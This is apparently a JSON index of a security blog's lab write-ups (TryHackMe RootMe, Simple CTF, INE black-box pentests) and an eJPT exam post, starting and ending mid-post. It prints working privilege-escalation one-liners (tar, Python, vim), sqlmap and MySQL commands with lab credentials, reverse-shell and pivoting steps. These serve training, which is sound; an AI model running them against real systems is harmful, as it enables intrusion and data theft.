brute-force attempts to the SSH service, password authentication should be disabled and private key authentication should have been enabled. The user, lin, should not have had the privileges to run tar as sudo.Summary of exploitsPrivilege EscalationIF tar has sudo privileges, obtain a root shell by:sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bashThis will attempt to compress the contents of /dev/null into /dev/null but executing an action at each checkpoint. The action will load a Bash interpreter with the privileges of the root user.Things I Learned Escalating privileges by abusing the SUDO privileges for the tar binary.References https://gtfobins.github.io/gtfobins/tar/#sudo &#8617; " }, { "title": "RootMe (Try Hack Me)", "url": "/posts/thm-root-me/", "categories": "Cybersecurity, Writeups", "tags": "thm, ctf, writeup, web application, reverse shell, privesc, burpsuite, suid, gobuster", "date": "2021-08-25 08:30:00 -0400", "snippet": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely commun...", "content": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.Note: The target IP address may change throughout the writeup as I complete the room over a period of time.ScenarioTitle: RootMeLink: https://tryhackme.com/room/rrootmeDescription: A ctf for beginners, can you root me?Free/Subsciber: FreeDifficulty: EasyEnumerationFirst things first, let’s start off with an nmap scan.From the scan results, the target is an Ubuntu OS as noted in the version information for the Apache and SSH services. These services are also the only two open ports: 22 (SSH) 80 (HTTP)SSHNo information leaked in the banner so nothing to see here.HTTPThe landing page doesn’t contain much information other than some self-writing text. No information is leaked in the page source and no robots.txt file. Directory enumeration did return a few results.Checking out the /panel endpoint, there is a form to upload a file.Knowing that the backend langugage is PHP through the PHPSESSID information in the nmap scan results, let’s try to upload a PHP reverese shell 1.Initial FootholdReverse ShellLooks like PHP files are blocked from being uploaded. There’s no indication that this a client-side filter by reviewing the JS source code, so this is probably server-side validation.Let’s intercept the upload request in Burpsuite and utilize an intruder attack.We will use a list of other PHP extensions in the hope that the server is filtering on the .php extension only 2.Extension Filter BypassSuccess! All of the extensions in our payload list except for .php was uploaded. This is clear by the larger response length in the burp intruder attack window.The gobuster results indicated that there is a /uploads directory so let’s verify our files are there.Great! Now we can use this to trigger our reverse shell connection.The rev.php3 and rev.php4 did not trigger the reverse shell connection but the rev.php5 file established the connection as seen below.The service running the Apache web server is www-data and if we check /var/www, there is a user.txt flag present.User flag: THM{y0u_g0t_a_sh3ll}Privilege EscalationOne of the privesc vectors to check for are binaries that are misconfigured with the SUID bit set. This allows a lesser privileged user to have the same privileges as the user that owns it.You can search for these binaries with the command find / -perm /4000 2&gt;/dev/null.It stood out that the /usr/bin/python was in the list of binaries with this bit set. GTFObins also has an entry to escalate your privileges if the SUID bit is set 3.Success! We have root privileges and found the root flag as well.Root Flag: THM{pr1v1l3g3_3sc4l4t10n}ReflectionThe second time around, this box was a great opportunity to learn how to bypass PHP extensions filters as well as learning about the SUID bit privilege escalation vector.Killchain Summary Perform directory enumeration to identify the /panel file upload endpoint. Identify a potential PHP extension that the server will accept by brute-forcing a list using Burpsuite. Upload pentestmonkey’s PHP reverse shell and catch the reverse shell from Netcat. Escalate privileges by abusing a SUID misconfigured Python binary with a command from GTFObins.Misconfigurations The /panel endpoint should be protected by an authentication portal. Robust filter to restricts file uploads which can trigger a reverse shell or restrict outgoing connections on the host-based firewall. Don’t configure the Python binary to have SUID privileges.Summary of ExploitsPrivilege EscalationIF Python has the SUID bit set, obtain a root shell by:/usr/bin/python -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'This command will execute a series of commands without launching a script or the Python interpreter. The command will import the os module and execute the execl function which executes a program but replaces the current process rather than returning.Things I Learned Using Burpsuite to bypass file upload restrictions by brute-forcing the list of valid PHP extensions. Escalating privileges using a SUID-bit misconfigured Python binary.References https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php &#8617; https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology &#8617; https://gtfobins.github.io/gtfobins/python/#suid &#8617; " }, { "title": "Simple CTF (Try Hack Me)", "url": "/posts/thm-simple-ctf/", "categories": "Cybersecurity, Writeups", "tags": "thm, ctf, writeup, ftp, web application, sqli, public exploit, password cracking, cms, reverse shell, vim, privesc", "date": "2021-08-24 11:30:00 -0400", "snippet": "I am currently in the process of completing these boxes on Try Hack Me again along in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely ...", "content": "I am currently in the process of completing these boxes on Try Hack Me again along in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.Note: The target IP address may change throughout the writeup as I complete the room over a period of time.ScenarioTitle: Simple CTFLink: https://tryhackme.com/room/easyctfDescription: Beginner level ctfFree/Subsciber: FreeDifficulty: EasyEnumerationFirst things first, let’s start off with an nmap scan of the target.The target is an Ubuntu OS as noted in the version information for the Apache service.There are two open ports on the system: 21 (FTP) 80 (HTTP)FTPThe nmap scan results indicated that anonymous authentication to the FTP server is allowed. Let’s check it out.There’s one file present in the pub directory, ForMitch.txt.Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!It seems that Mitch set the same weak password for the system user. This might be useful during our enumeration of the HTTP service. There’s not much else we can do with the FTP service so let’s check out the HTTP service.HTTPThe landing page is the default Apache index page but the nmap results indicated there were two entries in the robots.txt file so let’s check that out.A lot of comments but let’s first check out the /openemr-5_0_1_3 before we look into other things.Seems like that may have been a misdirection so let’s perform some directory enumeration and see if we obtain any results.Browsing to the /simple endpoint, we come acrossAt the bottom of the page, the CMS displays a version number of 2.2.8.SQLi ExploitWe can search for potential exploits for this CMS version.That last entry looks promising! We can copy it over to our current directory by searchsploit -m 46635.py.This script exploits a vulnerability in the News module permitting unauthenticated blind time-based SQLi 1.python2 46635.py -u http://10.10.170.54/simpleLet’s run the exploit without using the cracking password functionality.Looks like the exploit found some a username, email, salt, and hash! Looking through the exploit script’s password cracking functionality, it is brute force cracking the password with a MD5 hash of the salt and password!Password CrackingLet us try to use hashcat to crack the hash!mitch:secretLooks like Mitch has a password of secret to access the CMS database. The location of the login page is on the home page of the CMS Made Simple page.Browsing to http://10.10.170.54/simple/admin, we have succesfully logged in!Initial FootholdReverse ShellLooks like the File Manager section maps to the uploads path. Let’s try to upload a PHP reverse shell.It seems that the upload is not allowed presumably because of the PHP extension but this information isn’t displayed on the upload page. The server does return a more informative error.We are able to upload the file as a txt file and view it at http://10.10.170.54/simple/uploads/shell.txt.What if we try to rename the file?I tried a few things at this point but nothing was working. I Googled ways on uploading a PHP file to this CMS and came across a post from another CTF which stated that you could copy the file to a .php extension to bypass the upload policy. Eventually, that would have been my next option but I became impatient and looked it up. On top of that, there is a Metasploit module with the exact authenticated RCE Copy functionality2.With the file successfully uploaded, we can browse to the shell.php file on the uploads directory and trigger the reverse shell connection!We received a shell as www-data! Let’s upgrade this shell into an interactive TTY shell 3.Remembering the note from the FTP server, Mitch used the same pass for the system user. Let’s switch into mitch’s system account with the password secret.User Flag: G00d j0b, keep up!Privilege EscalationLooking into Mitch’s sudo privileges, he is able to execute vim as root with no password required.It is quite simple to escalate your privileges if you are able to execute vim as root as detailed in GTFObins 4.Gtfobins is a fantastic resource to manipulate binaries that are misconfigured to obtain root access, read files, etc.Once I opened up vim as sudo, I ran the following system command to escalate my privileges as root :!/bin/bash.Root Flag: W3ll d0n3. You made it!Useful CommandsHashcat with SaltTo include a salt along with the hash, separate it by a colon. If you have a MD5 hash and salt, use attack mode 20 with the hash file format as hash:salt.ReflectionWith my second time approaching this challenge, I think I did a significantly better job this time around enumerating the application, finding a vulnerability and a public exploit for that, and the privilege escalation technique.The one thing I can improve which I noted above was trying all potential methods of exploitation before searching online for a solution. I had already tried the option to move a file myself so I could have just as easily tried to copy the file. I will keep this in mind for future CTF boxes.This machine is fantastic at targeting an actual CMS application and searching for publicly disclosed vulnerabilities.Killchain Summary Authenticate to the FTP server anonymously and grab the ForMitch.txt file Locate the /simple endpoint through directory enumeration Use the public exploit for the version of CMS Made Simple obtain the username and MD5 hash of their password Crack the hash to obtain Mitch’s password and gain access to the CMS Made Simple admin console Upload a PHP reverse shell as a TXT file and copy the file renaming it with a PHP extension Escalate privileges through reverse shell by abusing the sudo privileges assigned to the VIM binaryMisconfigurations The FTP service should not have allowed us to authenticate anonymously. The CMS software had an SQL injection vulnerability and should have patched that by upgrading the CMS. On top of that, the administrators should remove references to the version information for the CMS. Even if the CMS has not been updated, the MD5 hash may not have been cracked if Mitch chose a strong password. The privilege escalation vector was by manipulating the VIM binary which was given full sudo access with no password required which doesn’t seem necessary.Summary of ExploitsThe exploit used to obtain the username, email, and hash through SQL injection is related to CVE-2019-9053. This exploit takes advantage of a vulnerability in the News Module component. An attacker could manipulate the m1_idlist argument as a query parameter which lead to a time-based SQL injection.A time-based SQL injection relies on the database pausing for a specified amount of time and then returning the results indicating that the query was successful. The attacker can enumerate each letter of the desired piece of data.Privilege EscalationIF vim has sudo privileges, break out and obtain a root shell by:$ sudo /usr/bin/vim:!/bin/bash -pThis is a feature within VIM to execute commands from the text editor. It is possible to execute a command to launch a Bash interpreter with escalated privileges.References https://vuldb.com/?id.132463 &#8617; https://www.rapid7.com/db/modules/exploit/multi/http/cmsms_upload_rename_rce &#8617; https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys &#8617; https://gtfobins.github.io/gtfobins/vim/#sudo &#8617; " }, { "title": "eJPT Certified!", "url": "/posts/ejpt-certification/", "categories": "Cybersecurity, Certifications", "tags": "eJPT, certification", "date": "2021-08-23 08:30:00 -0400", "snippet": "This weekend, I decided to take eLearnSecurity’s Junior Penetration Tester exam and I successfully passed it with a score of 19/20. Below is a quick post about the exam preparation, my experience, ...", "content": "This weekend, I decided to take eLearnSecurity’s Junior Penetration Tester exam and I successfully passed it with a score of 19/20. Below is a quick post about the exam preparation, my experience, a bit of advice, and some thoughts on the exam.MotivationI was searching for a low-cost introductory certification for penetration testing and several people on a few cybersecurity subreddits recommended it along with John Hammond rating it highly on his Youtube channel 1.This certification has been on my radar since early this summer and I am proud to say all the work and training that I have done has led to me passing the exam!My PreparationThis certification is accompanied by INE’s (previously eLearnSecurity) Penetration Testing Student course which I will link in the Exam Details section below. This course does not expect any prerequisite knowledge and is capable of being the sole resource needed to pass the certification.I took a slightly different approach in preparation for the exam. For each topic that I did not fully understand, I used TryHackMe to accompany that topic with an informational room or a CTF style room.An example of this was using the Overpass 2 room in THM to accompany the introduction of Wireshark in the PTS course. Overpass 2 is an interesting room where you are tasked with analyzing a packet capture, understanding how a hacker infiltrated the target machine, and using the knowledge gained to infiltrate the target machine yourself.Side note! I think Try Hack Me is another fantastic resource and if you are able to get the paid subscription, it is worth it!This is not required but the experience gained through completing rooms to assist in specific topics or just building experience in the pentest lifecycle was valuable during the exam.Once I felt I had enough experience, I began work on the three black-box pentest labs that are offered in the PTS course. Each of these labs contains a network range and several targets where you have to capture a “flag” on each. I approached each lab as if it was an exam scenario and only looked at the official writeup in two situations for minor hints as I had been stuck for 1 to 2 hours.The above practice provided me the confidence needed to scan and enumerate targets, perform exploitation techniques, privilege escalation, and comfortability with the various tools.AdvicePreparationYou do not have to follow the same path that I took for the preparation. The PTS covers enough content and provides enough practice opportunities to pass the exam.I do recommend putting a heavy emphasis on the labs especially. Obtaining practical hands-on experience is critical to your success in this certification. If you are not able to complete it without going through the writeup, approach it again a few days later trying to complete it with your understanding of the topics.Completing the black-box pentest labs forcing myself to explore every attack vector and not relying on the writeup is what I attribute a majority of my success to.Note: Programming knowledge is not required to pass the certification so don’t fret if you’re not a programming guru.I found the black-box pentest labs of a higher difficulty than the exam itself so if you’re able to complete those, the exam should be a piece of cake.Writing the ExamWithout providing too many details, be sure to thoroughly read the letter of engagement that is provided. Read the multiple choice questions a few times over prior to starting as the questions and answers will provide a guide on what information you are looking for.Most importantly, take lots of breaks. This exam is not like the OCSP. You have three days to complete the exam so if you are feeling like you’ve hit a roadblock, take a break or maybe a nap and come back to it. During the exam, take notes about all of your findings and the commands you have written so you can review the information you have found.Lastly, don’t make the same mistake that I made and overthink every little detail.Exam DetailsDetails of the exam: Cost: $200 USD Duration: 3 Days Exam Structure: Multiple Choice Passing Grade: 15/20 (75%) Certification Link: https://elearnsecurity.com/product/ejpt-certification/ PTS Link: https://my.ine.com/CyberSecurity/learning-paths/a223968e-3a74-45ed-884d-2d16760b8bbd/penetration-testing-studentExam topics to ensure you understand in no particular order: Network Scanning Target Enumeration Information Gathering and Reconnaissance Pivoting Routing Web Application Attacks: XSS SQL Injection Directory Enumeration Password Cracking Service Authentication CrackingIt’s also important to get comfortable with the tools that are covered in the course.ConclusionI can honestly say I have never enjoyed an exam as much as this one. I cannot overstate the quality of the course materials and certification process than the eLearnSecurity and INE have laid out. I highly recommend it as an introductory certification to anyone interesting in cybersecurity.Reach out to me if you have any questions about the certification, course, or anything else!References https://www.youtube.com/watch?v=CmBeSsCn0zM &#8617; " }, { "title": "PTS: Black-Box Penetration Test 3", "url": "/posts/black-box-pentest-3/", "categories": "Cybersecurity", "tags": "INE, PTS, eJPT, pentesting, writeup", "date": "2021-08-22 11:00:00 -0400", "snippet": "This is the 3rd writeup of 3 black-box penetration tests offered in INE’s Penetration Testing Student course that I am currently doing in my journey to obtain the eJPT certification.Scenario You h...", "content": "This is the 3rd writeup of 3 black-box penetration tests offered in INE’s Penetration Testing Student course that I am currently doing in my journey to obtain the eJPT certification.Scenario You have been engaged in a Black-box Penetration Test (172.16.37.0/24 range). Your goal is to read the flag file on each machine. On some of them, you will be required to exploit a remote code execution vulnerability in order to read the flag.Initial Enumeration and ExploitationThe scenario mentioned that the pentest range is taking place at 172.16.37.0/24. However, the VPN has connected us to 10.13.37.1/24 with another machine located at 10.13.37.1 as seen above in the Nmap scan results.With no open ports on the 10.13.37.1 host, I thought this may be a gateway into the 172.16.37.0/24 range that we are engaged to do the pentest on. As I combed through previous documentation to recall how to add this route to the routing, it seems that the VPN connection already added that route to our table!We can perform a typical scan on the assigned range to determine the available targets!172.16.37.1This target has no open ports but similar to the 10.13.37.1 machine, this may be a gateway to another network.172.16.37.220HTTPThe details provided by the Nmap scan reveal that port 80 is served by Apache on an Ubuntu OS.The landing page contains no visible data but the page source contains a comment with what appears to be the output of ifconfig.This target is dual homed with access to an additional network in the 172.16.50.0/24 range. If we are able to compromise this machine, there might be an opportunity to pivot through this network and compromise additional systems.Other than the leaked network interface information in the page source, there is not much else to see here.3307A tcpwrapped port means that we are not able to send or receive data with that port. This could be a firewall or an access control list that is blocking us from accesing that port. An attempt to establish a connection with netcat is closed instantly.For now, we have some information but not much to go off of so let’s continue with the next machine.172.16.36.234The FTP and HTTP services are running on non-standard ports on an Ubuntu OS.FTPThe banner for the ProFTPD service includes a comment to use ftpuser to authenticate. On a hunch, I also used the same for the password which authenticated us to the application.After successful authentication to the FTP server, the flag is available as a hidden text file along with an additional html folder.It seems that the directory that the FTP daemon is serving could be the same files that the web application is serving. If the ftpuser has write permissions to any of the directories, this would be a vector for remote code execution.I pulled the index.php and .flag.txt files as the index.html is likely the Apache landing page. We can verify this when we explore the HTTP service.# .flag.txtYou got the first machine!# /xyz/index.php&lt;?phpecho \"&lt;!-- cmd: \" . $_GET[\"cmd\"] . \"--&gt;\";echo \"&lt;hr /&gt;\";system(\"ifconfig\");?&gt;The index.php file in the xyz directory executes the ifconfig command which should be displayed on the web page if we browse to that endpoint.HTTPVisting the web application, both of our assumptions are confirmed. The Apache landing page relates to the index.html file and the index.php displays the network interface configuration for this target.This target is also dual-homed similar to the first one. We can attempt to create a reverse shell connection with a netcat listener on our attacker machine.Configuring the PHP reverse shell with our tap0 IP address and any port, put the file onto the FTP server 1 .Success! Now we can browse to http://172.16.37.234:40180/xyz/rev.php to trigger the reverse shell connection.Let’s upgrade this basic shell into a fully interactive TTY shell 2.Currently, we are the www-data user. In the search for any interesting files, I found a .message data file burrowed in some very lengthy named directories under the elsuser’s home directory. The data was just some binary data with ASCII text thrown in there but it seems this was a rabbit hole to potentially throw us off?A common step in the privilege escalation vector is to analyze the /etc/passwd file to see the list of system and non-system users.There are three additional users that are not root or the service users. elsuser ftpuser testWithout realizing it, I switched to the ftpuser hoping that the credentials from the FTP service were the same. Once we were authenticated, the prompt said root@xubuntu. The whoami command stated that we were root as well even though I logged in as the ftpuser.The official writeup verified that this is because the uid and gid of the ftpuser is 0 which is the root user.Success regardless! With this target compromised and our privileges escalated, let’s perform some post-exploitation techniques and perform a scan of the targets on the 172.16.50.0/24 network. We are already aware of 2 targets, 172.16.50.222 (first target) and 172.16.50.224 (this target).Fortunately for us, this target has nmap installed so we can leverage that to perform a network scan.Looks like there are only two machines on this network which we have already interacted with. There may be other services on the 1st machine that are only accessible through this second network so let’s perform some further enumeration of the 1st machine but on the 172.16.50.222 interface.172.16.50.222Compared to the original Nmap scan for this target but using the 172.16.37.220 interface, there is an additional SSH service accessible to us. Given the small hint about using ncrack’s minimal.usr password list, we can attempt to brute force the authentication for the root user to the SSH service.We could attempt to brute force using hydra and the password list by transferring the binary and wordlist onto the compromised machine. This lab, however, is focused on pivoting and this is a good opportunity for us to learn about how to pivot. There are several ways to accomplish this: Metasploit’s autoroute functionality Enable SSH for the ftpuser and enable that for a sock5 proxy Ncat and proxychains 3We’ll try out the ncat and proxychains method to establish an HTTP proxy. On the compromised machine, configure an HTTP proxy using Ncat on port 3128 with the command ncat -vv --listen 3128 --proxy-type http .Switching back to the attacker machine, add a line to the end of the /etc/proxychains.conf file with http 172.16.37.234 3128 . To proxy any command through the proxychains.conf file, prefix that command with proxychains.At this stage, our goal is to use proxychains to proxy our brute force attempts on the SSH service that is accessible through the 172.16.50.0/24 network.Woot! The root user on the 1st target machine has a password of root (terrible password security). But the power of a proxy with proxychains causes pivoting to be incredibly simple.The last step is to use proxychains to proxy our SSH connection through the compromised machine and grab the remaining flag.With this flag, we have successfully completed this penetration test.ReflectionThis pentest was a significantly easier experience than the 2nd that I had so much trouble with. This was definitely focused on the concept of pivoting and accessing additional networks so it may be more difficult in some sense.I enjoyed this last one and it may have been even more interesting to have a 3rd target in the 2nd network but who knows, that may be the configuration on the eJPT exam.Either way, this was a fantastic learning opportunity and the only hiccup I had was not understanding why switching to the ftpuser placed me as root but now, I’ll remember to thoroughly analyze the /etc/passwd file and all aspects of it.This was the last black-box pentest offered by INE as part of their Penetration Testing Student course. Some forums have indicated that the pentest labs are more challenging than the actual certification exam. Out of the three pentests, I think there were 2 or 3 very minor situations that revolved around not fully mapping out an application or service but I think I may be ready for the exam. Hopefully, the next post that I submit is a success post about my exam experience.Useful CommandsShell UpgradeUpgrading your shell into an interactive TTY shell is important so you can switch between users. Without a TTY, you won’t receive the prompt to enter passwords.Once you have a shell, determine the version of Python and spawn a Bash process.which pythonpython{2,3} -c 'import pty; pty.spawn(\"/bin/bash\")'Background the shell using Ctrl+Z.In your attacker machine’s terminal, run stty -a and take note of the number of rows and columns.Run stty raw -echo. At this point, your terminal prompt may be a bit buggy and not display anything. Bring the reverse shell back to the foreground with the fg command. This may not show up in your terminal but have faith that it’s there.Pressing enter a few times and you should now have an interactive prompt. The last thing to do is to modify the rows and coluns of the reverse shell from what you noted down before.stty rows &lt;rows&gt; columns &lt;columns&gt;Nmap Host DiscoveryTo perform a host discovery scan without port scanning:nmap -sn 10.13.37.0/24References https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php &#8617; https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ &#8617; https://nullsweep.com/pivot-cheatsheet-for-pentesters/ &#8617; " }, { "title": "PTS: Black-Box Penetration Test 2", "url": "/posts/black-box-pentest-2/", "categories": "Cybersecurity", "tags": "INE, PTS, eJPT, pentesting, writeup", "date": "2021-08-21 12:00:00 -0400", "snippet": "This is the 2nd writeup of 3 black-box penetration tests offered in INE’s Penetration Testing Student course that I am currently doing in my journey to obtain the eJPT certification.Scenario You h...", "content": "This is the 2nd writeup of 3 black-box penetration tests offered in INE’s Penetration Testing Student course that I am currently doing in my journey to obtain the eJPT certification.Scenario You have been engaged in a Black-box Penetration Test (172.16.64.0/24 range). Your goal is to read the flag file on each machine. On some of them, you will be required to exploit a remote code execution vulnerability in order to read the flag.Expecting a similar structure to the previous pentest, I broke down the enumeration and exploitation sections into an initial and revisited section.Initial Enumeration and ExploitationFping returns four available target machines ready for exploitation not including our own IP address!172.16.64.81There are three services running on an Ubuntu OS (indicated in the SSH and Apache service version). Let’s enumerate these services further.SSHAs usual, nothing to see here unless we have credentials.HTTPIn a typical fashion, I performed the following steps: browse the landing page and hyperlinks view source code check for robots.txtI did not find any interesting information in the default Apache landing page so the next step is directory enumeration.Gobuster returned two directories, /default and /webapp. The /default directory just displayed the Apache default landing page once again and further directory enumeration returned no results.The /webapp is the likely entry point for us and the directory enumeration for this directory returned many interesting results!The /webapp endpoint displays a login page but not very useful with no potential credentials.There are many interesting directories for us to look into from the gobuster results. The robots.txt file contains many Disallow entries that we can explore.# /webapp/robots.txtUser-agent: *Disallow: /assets/Disallow: /css/Disallow: /emails/Disallow: /img/Disallow: /includes/Disallow: /install/Disallow: /lang/Disallow: /sociallogin/Disallow: /templates/Disallow: /upload/The /sociallogin/ did not turn up in the gobuster results since it wasn’t an entry in the common.txt list but it’s another one to add to our list to explore.The majority of the directories did not return any interesting information that was potentially usable. The only interesting piece of information was hidden away in /webapp/img/custom/thumbs/users.bak which contained two usernames and passwords.# /webapp/img/custom/thumbs/users.bakjohn1:password123peter:youdonotguessthatone5Testing both pairs of credentials on the SSH and MySQL services led to no results. Attempting these credentials on the /webapp login page only worked for john1 and not peter. On successful authentication, the server redirected us to cms.foocorp.io with the page failing to load as that site doesn’t exist.I tried to add the machine’s IP address and the cms.foocorp.io domain as an entry in /etc/hosts which did improve the error but still returned an error.In the first image, the server is trying to redirect us to /home.php while in the second image, we are redirected to /500.php.With almost no other vectors remaining, it seems that we are potentially missing information or we are going down a rabbit hole. Let’s move on to the other boxes and revisit this one once we have additional information.172.16.64.91HTTPThe landing page was the default Apache landing page with no information leaked in the page source, no robots.txt file, no files to browse and no directory enumeration results with the directory-list-2.3-medium.txt file.RedisRedis is a plaintext protocol which means we can perform a banner grab using netcat. The connection was established with no banner but we are able to send commands.We can use a few enumeration techniques to determine if the Redis key-store requires authentication or not 1.The info command informed us that authentication is required. Redis can require a username and password combination or just a password. In this case, the auth attempt means only a password is required. The credentials found in the 1st do not work so this target might need to be approached later after more work has been completed.172.16.64.92SSHWith no banner leaked and no valid credentials, there is not much to see here.DNSWith the DNS lookup, we obtained information about subdomains in the foocorp.io virtual hosting. The dns.foocorp.io entry is only application to this machine but through localhost. The entry 75ajvxi36vchsv584es1.foocorp.io. is very helpful for us to continue further enumeration with the 2nd machine that we abandoned due to lack of info. We will loop back around to that machine after further enumerating this one.With a DNS server, we can perform DNS lookups on the IP addresses in the range to determine if there are any domains assigned to those IPs 2.Great! There’s a subdomain entry for the previous machine which we can use for when we revisit it.HTTPOn loading of the landing page, an alert popped up stating “Loaded”. On first instinct, I checked out the Javascript that was triggering this alert and in the file footracking.js, there was subdomain path that led to a login page.Directory enumeration did not return any interesting directories with valuable info but we can perform this enumeration on the /72ab311dcbfaa40ca0739f5daf505494 directory as well.The site contained a tracking.php page providing random information about a select number of hosts in the network which don’t seem like they exist. Using sqlmap to determine if the id parameter is vulnerable, sqlmap was able to perform a UNION injection payload to retrieve access to all of the data.sqlmap -u http://172.16.64.92/72ab311dcbfaa40ca0739f5daf505494/tracking.php?id=1 -D footracking -T users --dumpA more detailed list of commands that led to the above command are documented below in the Useful Commands section but the image above displays the full SQL dump of the footracking database. Let’s focus in on the footracking database.The telemetry_test table contains the data that is displayed to the tracking.php page when a query was submitted. This data is bogus User-Agent and Platform data that is not relevant. Focusing on the users database, there is vital information that we could use to authenticate to the application. id adm password username 1 yes c5d71f305bb017a66c5fa7fd66535b84 fcadmin1 2 yes 14d69ee186f8d9bbeddd4da31559ce0f fcadmin2 3 no 827ccb0eea8a706c4c34a16891f84e7b tracking1 4 no e10adc3949ba59abbe56e057f20f883e tracking2 The hash-identifier tool identified these hashes to likely be MD5 hashes. Let’s use a dictionary attack method using hashcat to crack these passwords.hashcat -a 0 -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -a 0: Dictionary attack mode -m 0: MD5 hashes hashes.txt: List of hashes separated by newline /usr/share/wordlists/rockyou.txt: Password listThe hashes.txt file contains the four hashes form the password column of the users table. It seems that the non-administrative user hashes were cracked. If rockyou.txt wasn’t able to crack the admin hashes, they may require brute force cracking.We can attempt to log into the application using the credentials tracking1:12345.Since the tracking1 user is not an admin, they are restricted from accessing the console. Viewing the source code, the credentials for access to the database is leaked.Database credentials dbuser:xXxyYyzZz789789)))We can connect to the database using the mysql client.mysql -P 63306 -h 172.16.64.92 -u dbuser -p'xXxyYyzZz789789)))'Once connected, the data is the same as the data that we obtained through the sqlmap dump. At this point, I was stumped for a while until I realized we could potentially change the passwords of the admin users to gain administrative access to the web page.We can update the database with the hash 098f6bcd4621d373cade4e832627b4f6 and log in to the application using fcadmin1:test.Executing the command below in the MySQL console will update the user with the ID of 1 which is the fcadmin1 user.UPDATE users SET password = \"098f6bcd4621d373cade4e832627b4f6\" WHERE id = 1;Let’s try logging in now.Success! We have logged in to the application as the administrative user.Lesson: My initial and only tactic was trying various numbers and Bash commands such as whoami or pwd. I took a quick peek at INE’s official writeup of this lab to see that this is a PHP shell. The lesson is to not give up on the first roadblock, think rationally, and try to assess what you have tried and have not tried.Once it was determined that it was a PHP shell, we can generate a reverse shell using PHP’s exec command 3.With a netcat listener configured on port 80, executing the command in the console causes the application to freeze, and we see the connection established on netcat. A quick search for flag.txt and we have found the flag meaning we have successfully completed the objective on this machine!172.16.64.166SSHI do not come across this often but the SSH service is displaying a banner informing the employee to change the default password CHANGEME. However, we cannot do much without a potential username which the web service at port 8080 may contain.HTTPOn the About Us page, there is a section stating Who We Are but this is protected by a login page. However, viewing the page source displays all of the usernames in a HTML comment.I have provided a sample of the list of names that I had come across.Below is the full list of first names lowercased that could potentially provide SSH access.tarabeckyrandypabloelizabethbessiegerardosabrinaLet’s brute force the SSH login attempt with the above usernames and see if any of the above usernames are valid.Success! Finally, we have rooted one of the four boxes that we have come across so far. Sabrina was the employee with the insecure password, CHANGEME, that provided us access to the SSH service. Valid credentials: sabrina:CHANGEME.The first file is the flag.txt but the second file may assist us further with the first target machine we began exploiting. The two entries in the hosts.bak file that matter the most are# hosts.bak172.16.64.81\tcms.foocorp.io172.16.64.81\tstatic.foocorp.ioIf we recall, the first target machine was redirecting us to a 500.php each time we logged in to the /webapp endpoint. This may be because the static content was served from a different virtual host or subdomain which our system did not know how to resolve.With this machine fully exploited and with new information, let’s switch back to the first machine.Targets RevisitedHacking is a cyclical process so we should revisit targets that were not exploited anytime new information is obtained.172.16.64.81 RevisitedHTTPAfter hitting a roadblock the first time approaching this target, I am coming back to it after learning more information from exploiting the 4th machine at 172.16.64.166. With new information regarding the two entries to be added to the /etc/hosts file, I’ll perform directory enumeration on both domains.For the cms.foocorp.io domain, it appears to be the same application we enumerated initially with additional files since we included the -x switch to our gobuster command to search for files with the .php extension.This web service has virtual hosting as the application at static.foocorp.io is different from the application at cms.foocorp.io. This is apparent in the landing page of static.foocorp.io.Sifting through all of the php files found in the cms.foocorp.io domain did not return any useful data. The static.foocorp.io/login endpoint is protected by HTTP Basic Authentication for which the john1 and peter credentials did not work.Originally, I didn’t have the foresight to search through the requests in the Firefox’s Network tab. Analyzing them now, the credentials to the MySQL server on this application are leaked in the headers of the Response!Headers that begin with X- are custom headers that are set by the system.MySQL Credentials: root:x41x41x412019!Let’s use this information to grab all the data from the MySQL server.MySQLmysql -P 13306 -u root -px41x41x412019! -h 172.16.64.81Connecting to the MySQL server, there is one additional database that is not a part of the system databases which is cmsbase. The database contains the flag table informing us that we have obtained the flag and rooted this machine.The additional tables in the cmsbase database contains some information about the application and various users that we can save for potential future use.The second image contains two usernames that we have already seen. However, it seems as if the hashed passwords for all three users are the same. Cracking this hash using John the Ripper returns password123 for all three users. This is verified when we successfully authenticate with the credentials below into the cms.foocorp.io application.john1:password123peter:password123foocorpadmin:password123In the first image, we have three users assigned to the top level foocorp.io domain which could be valuable for the 2nd and 3rd machines which we have not exploited yet.Using John the Ripper and the rockyou.txt wordlist has cracked 2 of the 3 passwords.mickey:mickey1donald:donaldduckLeftoverI’m not 100% sure the purpose of the static.foocorp.io application or the SSH service. The users found in the tbl_users table were not valid credentials for any applications, SSH service, or MySQL service. They could be helpful in the other two machines but with the flag obtained and post-exploitation research completed, we can be confident in moving on to the next machine.172.16.64.91 RevisitedWhen we approached the box with no new information, we did not find any potential exploitation vectors. However, after enumerating 172.16.64.92’s DNS service, there was a subdomain entry of 75ajvxi36vchsv584es1.foocorp.io for the IP address 172.16.64.91. Adding this to our /etc/hosts, we have a landing page that is not the Apache default page.There is nothing interesting here but directory enumeration includes a result for /app. This page includes an upload form that we may be able to use to establish a reverse shell.This page loads a JS file which displays a prompt every second indicating that “You have to be logged in to continue” redirecting us to denied.php -&gt; denied1.php -&gt; back to index.php. This cycle does not allow us to explore the application so we can use Burpsuite to modify the JS file or just remove the reference to the auth.js file completely.Using the upload form, I tried all possible variations of PHP extensions, various MIME types, text files but any attempt to upload a file lead to a response stating that “Security alert! This file is not allowed.”. So I tried directory enumeration further to see if there was other potential data that I was missing.Lesson: At this stage I was lost as there was not much to go off of. A terrible habit of mine is to not map out the application completely. I glanced at the INE writeup for less than half a second and gained additional context as to what I am missing (another terrible habit of mine). For future Robin, focus on understanding the application’s functionality before giving up.The solution was only obtained by realizing that I had to make some change about the upload.php in the source code.The application submits the uploaded file to the /app/upload/upload.php 